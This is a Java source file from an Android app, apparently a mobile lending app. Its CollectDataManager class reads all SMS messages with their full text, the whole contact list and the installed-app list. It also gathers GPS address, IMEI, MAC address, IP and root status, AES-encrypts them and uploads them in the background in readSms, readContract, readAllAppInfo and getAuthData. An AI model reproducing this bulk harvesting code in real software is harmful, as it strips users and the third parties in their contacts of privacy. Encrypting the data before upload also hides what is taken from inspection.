package com.instahela.deni.mkopo.data;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.blankj.utilcode.util.DeviceUtils;
import com.blankj.utilcode.util.GsonUtils;
import com.blankj.utilcode.util.NetworkUtils;
import com.blankj.utilcode.util.PhoneUtils;
import com.blankj.utilcode.util.ThreadUtils;
import com.blankj.utilcode.util.Utils;
import com.instahela.deni.mkopo.BuildConfig;
import com.instahela.deni.mkopo.api.Api;
import com.instahela.deni.mkopo.bean.request.AppInfoRequest;
import com.instahela.deni.mkopo.bean.request.ContactRequest;
import com.instahela.deni.mkopo.bean.request.SmsRequest;
import com.instahela.deni.mkopo.global.Constant;
import com.instahela.deni.mkopo.test.Test;
import com.instahela.deni.mkopo.util.MappingUtils;
import com.instahela.deni.mkopo.util.security.AESKeyGeneratorJ;
import com.instahela.deni.mkopo.util.security.StringUtilsJ;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class CollectDataManager {

    private static final String TAG = "CollectDataManager";

    private static CollectDataManager mManager;

    private CollectDataManager() {

    }

    public static CollectDataManager getInstance() {
        if (mManager == null) {
            synchronized (DataManager.class) {
                if (mManager == null) {
                    mManager = new CollectDataManager();
                }
            }
        }
        return mManager;
    }

    //12
//13 获取设备制造商
//14 整个产品的名称
//15 设备标签。如release-keys 或测试的 test-keys
//16 时间
//17 设备版本类型  主要为""user"" 或""eng""
//            18 设备用户名 基本上都为android-build
//19 获取系统版本字符串。如4.1.2 或2.2 或2.3等
//20 设备当前的系统开发代号，一般使用REL代替
//21 系统源代码控制值，一个数字或者git hash值
//22 系统的API级别 一般使用下面大的SDK_INT 来查看
//23 系统的API级别 数字
//24
    //
    public void collectHardware() {
        ThreadUtils.executeByCached(new ThreadUtils.SimpleTask<Object>() {
            @Override
            public Object doInBackground() throws Throwable {
                collectHardwareInternal();
                return null;
            }

            @Override
            public void onSuccess(Object result) {

            }
        });
    }

    private void collectHardwareInternal() {
        String aesAccountIdStr = "";
        String aesUniqDeviceIdStr = "";
        String aesOsBoardStr = "";
        String aesOsCpuAbiStr = "";
        String aesOsCpuAbi2Str = "";
        String aesOsIdStr = "";
        String aesOsModelStr = "";
        try {
//            JSONObject jsonObject = new JSONObject();
//            jsonObject.put(MappingUtils.getAccountId(), StringUtilsJ.aes(Constant.mAccountId));
//            jsonObject.put(MappingUtils.getUniqDeviceId(), StringUtilsJ.aes(DeviceUtils.getUniqueDeviceId()));    //用户唯一id
//            jsonObject.put("osBoard", DeviceUtils.get); // 获取设备基板名
//            jsonObject.put("osBootLoad", Constant.mAccountId);  //获取设备引导程序版本号
//            jsonObject.put(MappingUtils.getOsBoard(), StringUtilsJ.aes(DeviceUtils.getModel()));     // 获取设备品牌
//            String[] abIs = DeviceUtils.getABIs();
//            if (abIs != null) {
//                if (abIs.length >= 1) {
//                    aesOsCpuAbiStr
//                    jsonObject.put(MappingUtils.getOsCpuAbi(), StringUtilsJ.aes(abIs[0]));    //获取设备指令集名称（CPU的类型）
//                }
//                if (abIs.length >= 2) {
//                    jsonObject.put(MappingUtils.getOsCpuAbi2(), StringUtilsJ.aes(abIs[1]));    //获取第二个指令集名称
//                }
//            }
//            jsonObject.put("osDevice", Constant.mAccountId);    //获取设备驱动名称
//            jsonObject.put("osDisplay", Constant.mAccountId);   //获取设备显示的版本包（在系统设置中显示为版本号）和ID一样
//            jsonObject.put("osHardware", Constant.mAccountId);  //设备硬件名称,一般和基板名称一样（BOARD）
//            jsonObject.put("osDisplay", Constant.mAccountId);   //设备主机地址
//            jsonObject.put("osHost", Constant.mAccountId);      //设备版本号
//            jsonObject.put(MappingUtils.getOsId(), StringUtilsJ.aes(DeviceUtils.getAndroidID()));       // 获取手机的型号 设备名称
//            jsonObject.put("osHost", Constant.mAccountId);
//            jsonObject.put(MappingUtils.getOsModel(), StringUtilsJ.aes(DeviceUtils.getModel()));
//            jsonObject.put(MappingUtils.getOsManufacturer(), StringUtilsJ.aes(Constant.mAccountId));
//            jsonObject.put("osProduct", Constant.mAccountId);
//            jsonObject.put("osTags", Constant.mAccountId);
//            jsonObject.put("osTime", Constant.mAccountId);
//            jsonObject.put("osType", Constant.mAccountId);
//            jsonObject.put("osUser", Constant.mAccountId);
//            jsonObject.put("osvRelease", Constant.mAccountId);
//            jsonObject.put("osvCodename", Constant.mAccountId);
//            jsonObject.put("osvIncremental", Constant.mAccountId);
//            jsonObject.put("osvSdk", Constant.mAccountId);
//            jsonObject.put("osvSdkInt", Constant.mAccountId);
//            jsonObject.put("jsonData", Constant.mAccountId);    //硬件信息集合

            aesAccountIdStr = StringUtilsJ.aes(Constant.mAccountId);
            aesUniqDeviceIdStr = StringUtilsJ.aes(DeviceUtils.getUniqueDeviceId());
            aesOsBoardStr = StringUtilsJ.aes(DeviceUtils.getModel());
            String[] abIs = DeviceUtils.getABIs();
            if (abIs != null) {
                if (abIs.length >= 1) {
                    String abi = abIs[0];
                    aesOsCpuAbiStr = StringUtilsJ.aes(abi);
                }
                if (abIs.length >= 2) {
                    String abi2 = abIs[1];
                    aesOsCpuAbi2Str = StringUtilsJ.aes(abi2);
                }
            }
            aesOsIdStr = StringUtilsJ.aes(DeviceUtils.getAndroidID());
            aesOsModelStr = StringUtilsJ.aes(DeviceUtils.getModel());

        } catch (NoSuchPaddingException | InvalidKeyException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException | InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        }
        OkGo.<String>post(Api.HARE_WARE_COLLECT_URL).tag(TAG).
                headers("signature", AESKeyGeneratorJ.getInstance().getEncryptedKey()).
                params(MappingUtils.getAccountId(), aesAccountIdStr).
                params(MappingUtils.getUniqDeviceId(), aesUniqDeviceIdStr).
                params(MappingUtils.getOsBoard(), aesOsBoardStr).
                params(MappingUtils.getOsCpuAbi(), aesOsCpuAbiStr).
                params(MappingUtils.getOsCpuAbi2(), aesOsCpuAbi2Str).
                params(MappingUtils.getOsId(), aesOsIdStr).
                params(MappingUtils.getOsModel(), aesOsModelStr).
                execute(new StringCallback() {

                    @Override
                    public void onSuccess(Response<String> response) {
                        Log.e("Test", " collect handware " + response.body());
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
                    }
                });
    }

    public void collectAuthData(Context context, String orderId, Observer observer) {
        ThreadUtils.executeByCached(new ThreadUtils.SimpleTask<Object>() {
            @Override
            public Object doInBackground() throws Throwable {
                String smsStr = GsonUtils.toJson(readSms(context));
//                String callRecordStr = readCallRecord(context);
                String contractStr = GsonUtils.toJson(readContract(context));
                String appInfoStr = GsonUtils.toJson(readAllAppInfo());

                String smAesStr = StringUtilsJ.aes(smsStr);
//                String callAesStr = StringUtilsJ.aes(callRecordStr);
                String contractAesStr = StringUtilsJ.aes(contractStr);
                String appInfoAesStr = StringUtilsJ.aes(appInfoStr);

                String addressInfo = GsonUtils.toJson(LocationMgr.getInstance().getAddressInfo());

                String addressAesInfo = StringUtilsJ.aes(addressInfo);
                getAuthData(smAesStr, "", contractAesStr, appInfoAesStr, addressAesInfo, orderId, observer);
                return null;
            }

            @Override
            public void onSuccess(Object result) {

            }
        });
    }

    private static ArrayList<SmsRequest> readSms(Context context) {
        ArrayList<SmsRequest> list = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/");
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "status", "read"};
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = resolver.query(uri, projection, null, null, null);
        try {
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    int _id = cursor.getInt(0);//id
                    String address = cursor.getString(1);//电话号码
                    String body = cursor.getString(3);//短信内容
                    long date = cursor.getLong(4);
                    int type = cursor.getInt(5);
                    int status = cursor.getInt(6);
                    int read = cursor.getInt(7);

                    SmsRequest smsRequest = new SmsRequest();
                    smsRequest.addr = address;
                    smsRequest.body = body;
                    smsRequest.time = date;
                    smsRequest.type = type;
                    smsRequest.status = status;
                    smsRequest.read = read;
//                    public int read;
//                    public int status;
                    smsRequest.addr = address;
                    list.add(smsRequest);
                }
            }
        } catch (Exception e) {
            if (BuildConfig.DEBUG) {
                throw e;
            }
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }

    private String readCallRecord(Context context) {
        StringBuffer callRecordContent = new StringBuffer();
        ContentResolver cr = context.getContentResolver();
        Uri uri = CallLog.Calls.CONTENT_URI;
        String[] projection = new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE,
                CallLog.Calls.TYPE};
        Cursor cursor = null;
        try {
            cursor = cr.query(uri, projection, null, null, null);
            while (cursor.moveToNext()) {
                String number = cursor.getString(0);
                long date = cursor.getLong(1);
                int type = cursor.getInt(2);
                callRecordContent.append("num ").append(number)
                        .append("date ").append(date)
                        .append(type).append(type);
            }
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "read cardCord exception = " + e.toString());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callRecordContent.toString();
    }

    private ArrayList<ContactRequest> readContract(Context context) {
        //调用并获取联系人信息
        Cursor cursor = null;
        ArrayList<ContactRequest> list = new ArrayList<>();
        try {
            cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));
                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    long lastUpdateTime = cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
//                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
                    ContactRequest contactRequest = new ContactRequest();
                    contactRequest.name = displayName;
                    contactRequest.number = number;
                    contactRequest.lastUpdate = lastUpdateTime;
                    list.add(contactRequest);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, " exception = " + e.toString());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }

    private ArrayList<AppInfoRequest> readAllAppInfo() {
        ArrayList<AppInfoRequest> list = new ArrayList<>();
        PackageManager pm = Utils.getApp().getPackageManager();
        if (pm == null) {
            return list;
        }
        List<PackageInfo> installedPackages = pm.getInstalledPackages(0);
        if (installedPackages == null) {
            return list;
        }
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = installedPackages.get(i);

            AppInfoRequest appInfoRequest = new AppInfoRequest();
            appInfoRequest.packageName = packageInfo.packageName;
            appInfoRequest.lu = packageInfo.lastUpdateTime;
            appInfoRequest.it = packageInfo.firstInstallTime;
            ApplicationInfo ai = packageInfo.applicationInfo;
            if (ai != null){
                 boolean isSystem = (ApplicationInfo.FLAG_SYSTEM & ai.flags) != 0;
                 appInfoRequest.type = isSystem ? 0 : 1;
                 try {
                     appInfoRequest.name = ai.loadLabel(pm).toString();
                 } catch (Exception e){

                 }
            }
            list.add(appInfoRequest);
        }
        return list;
    }

    @SuppressLint("MissingPermission")
    private static void getAuthData(String smAesStr, String callAesStr, String
            contractAesStr, String appInfoAesStr, String addressAesInfo, String orderId, Observer observer) {
        String aesAccordIdStr = "";
        String aesImeiStr = "";
        String aesAndroidIdStr = "";
        String aesMacStr = "";
        String aesUniqDeviceStr = "";
        String aesBrandStr = "";
        String aesIsRootStr = "";
        String aesIsEmulatorStr = "";
        String aesInnerVersionCodeStr = "";
        String aesUserIpStr = "";
        String aesOrderIdStr = "";
        try {
            aesAccordIdStr = StringUtilsJ.aes(Constant.mAccountId);
            aesImeiStr = StringUtilsJ.aes(PhoneUtils.getIMEI());
            aesAndroidIdStr = StringUtilsJ.aes(DeviceUtils.getAndroidID());
            aesMacStr = StringUtilsJ.aes(DeviceUtils.getMacAddress());
            aesUniqDeviceStr = StringUtilsJ.aes(DeviceUtils.getUniqueDeviceId());
            aesBrandStr = StringUtilsJ.aes(DeviceUtils.getModel());
            aesIsRootStr = StringUtilsJ.aes(DeviceUtils.isDeviceRooted() + "");
            aesIsEmulatorStr = StringUtilsJ.aes(DeviceUtils.isEmulator() + "");
            aesInnerVersionCodeStr = StringUtilsJ.aes(DeviceUtils.getSDKVersionCode() + "");
            aesUserIpStr = StringUtilsJ.aes(NetworkUtils.getIPAddress(true));
            aesOrderIdStr = StringUtilsJ.aes(orderId);

            if (BuildConfig.DEBUG){
                Test test2 = new Test();
                test2.init(AESKeyGeneratorJ.getInstance().getAESKey());
                String testAccordId = test2.decryptMessage(aesAccordIdStr);
                String testImei = test2.decryptMessage(aesImeiStr);
                String testAndroidId = test2.decryptMessage(aesAndroidIdStr);
                String testMac = test2.decryptMessage(aesMacStr);
                String testUniqeDevice = test2.decryptMessage(aesUniqDeviceStr);
                String testBrand = test2.decryptMessage(aesBrandStr);
                String testIsRoot = test2.decryptMessage(aesIsRootStr);
                String testIsEmulator = test2.decryptMessage(aesIsEmulatorStr);
                String testInnerVersion = test2.decryptMessage(aesInnerVersionCodeStr);
                String testUSerIp = test2.decryptMessage(aesUserIpStr);
                String testOrderId = test2.decryptMessage(aesOrderIdStr);
                String testSms = test2.decryptMessage(smAesStr);
                String testContract = test2.decryptMessage(contractAesStr);
                String testAppInfo = test2.decryptMessage(appInfoAesStr);
                String testAddressInfo = test2.decryptMessage(addressAesInfo);
                // TODO for debug
            }
        } catch (NoSuchPaddingException | InvalidKeyException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException | InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        }
        OkGo.<String>post(Api.USER_INFO_UPLOAD_URL).tag(TAG).
                headers("signature", AESKeyGeneratorJ.getInstance().getEncryptedKey()).
                params(MappingUtils.getAccountId(), aesAccordIdStr).
                params(MappingUtils.getSms(), smAesStr).     //短信记录
                params(MappingUtils.getGps(), addressAesInfo).   //GPS位置信息
                params(MappingUtils.getImei(), aesImeiStr).          //手机IMEI
                params(MappingUtils.getAndroidId(), aesAndroidIdStr).    // Android ID
                params(MappingUtils.getMac(), aesMacStr).                //手机mac地址
                params(MappingUtils.getUniqDeviceId(), aesUniqDeviceStr).   //设备唯一标识
                params(MappingUtils.getBrand(), aesBrandStr).                //手机品牌型号
                params(MappingUtils.getAppList(), appInfoAesStr).                //app安装列表
                params(MappingUtils.getIsRooted(), aesIsRootStr).                //是否手机最高权限
                params(MappingUtils.getIsEmulator(), aesIsEmulatorStr).          //是否模拟器
                params(MappingUtils.getInnerVersionCode(), aesInnerVersionCodeStr).  //内部版本号
                params(MappingUtils.getContacts(), contractAesStr).     //通话记录Hash
                params(MappingUtils.getUserIp(), aesUserIpStr).          //用户公网IP
                params(MappingUtils.getOrderId(), aesOrderIdStr).
                execute(new StringCallback() {

                    @Override
                    public void onSuccess(Response<String> response) {
//                        Log.i(TAG, " response success= " + response.body());
                        if (observer != null) {
                            observer.success(response);
                        }
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
//                        Log.i(TAG, "getAuthData response error = ");
                        if (observer != null) {
                            observer.failure(response);
                        }
                    }
                });
    }

    public interface Observer {
        void success(Response<String> response);

        void failure(Response<String> response);
    }
}
